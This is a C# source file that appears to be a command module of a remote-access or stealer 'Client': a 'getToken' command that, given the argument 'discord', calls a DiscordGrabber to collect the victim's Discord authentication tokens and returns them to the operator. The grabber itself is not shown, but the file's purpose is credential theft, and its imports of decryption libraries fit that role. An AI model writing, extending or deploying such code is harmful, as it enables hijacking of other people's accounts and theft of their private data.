using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.Collections.Generic;

namespace Client.Commands
{
    class getToken:Command
    {
        public getToken(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 0) return "Expected argument for gettoken";
            try
            {
                switch (args.First())
                {
                    case "discord":
                        string tokenList = "";

                        foreach (string token in DiscordGrabber.GetTokens()) tokenList += token + ", ";

                        return tokenList;

                    default:
                        return "Unexpected argument " + args[0];
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }
}
